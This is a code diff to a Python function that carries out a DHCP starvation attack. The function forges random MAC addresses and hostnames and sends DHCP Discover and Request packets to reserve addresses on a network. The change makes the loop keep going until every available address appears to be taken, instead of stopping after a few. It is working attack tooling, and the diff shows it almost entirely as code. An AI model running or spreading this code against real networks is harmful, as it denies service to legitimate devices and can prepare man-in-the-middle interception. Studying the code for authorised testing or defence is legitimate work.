@@ -16,9 +16,9 @@ import time
 def starvation(free_ip, interface):
 
     reserved_IP = []
-    cpt = (len(free_ip) - 10)
+    nok = 0
 
-    while len(free_ip) > cpt:
+    while nok < 5:
         
         # Get random value
         hostname = fct_random.hostname()
@@ -26,29 +26,35 @@ def starvation(free_ip, interface):
         mac = fct_random.valid_mac()
 
         # DHCP Discover
-        print (f"\nFake MAC is : {mac}\n")
         sniff_packet = fct_dhcp.listener(mac)
         fct_dhcp.discover(mac, hostname, xid, interface)
         # DHCP Offer
         dhcp_offer = fct_dhcp.listener_join(sniff_packet)
-        dst_mac, offer_ip = fct_dhcp.get_offer_information(dhcp_offer)
-        # DHCP Request
-        sniff_packet = fct_dhcp.listener(mac)
-        fct_dhcp.request(dst_mac, offer_ip, hostname, xid, interface)
-        # DHCP Ack
-        dhcp_ack = fct_dhcp.listener_join(sniff_packet)
-        ack_mac, ack_ip = fct_dhcp.get_ack_information(dhcp_ack)
-
-        # ARP request from DHCP Server
-        #sniff_packet = scapy.sniff(count=1, filter=f"arp and arp[6:2] = 1 and host {ack_ip}", timeout=10)
-        #if sniff_packet:
-        #    fct_responder.responder(sniff_packet, ack_mac, interface)
+        try:
+            dst_mac, offer_ip = fct_dhcp.get_offer_information(dhcp_offer)
+            if offer_ip:
+                # DHCP Request
+                sniff_packet = fct_dhcp.listener(mac)
+                fct_dhcp.request(dst_mac, offer_ip, hostname, xid, interface)
+                # DHCP Ack
+                dhcp_ack = fct_dhcp.listener_join(sniff_packet)
+                ack_mac, ack_ip = fct_dhcp.get_ack_information(dhcp_ack)
+            if ack_ip:
+                print(f"{Green}[DHCP]{White} New IP reserved - {ack_ip}")
+                free_ip.remove(ack_ip)
+                reserved_IP.append((ack_ip, ack_mac))
+                # set null variable
+                del offer_ip
+                del ack_ip
+        except:
+            nok += 1
+            if nok >= 5:
+                print(f"{Green}[DHCP]{White} All availables IP address seen to be reserved")
 
         # Output
-        if ack_ip:
-            print(f"{Green}[DHCP]{White} New ip reserved - {ack_ip}")
-            free_ip.remove(ack_ip)
-            reserved_IP.append((ack_ip, ack_mac))
         time.sleep(1)
+    
+    # End of DHCP Starvation
+    print(f"{Blue}[MODE]{White} Listening network...")
 
     return reserved_IP
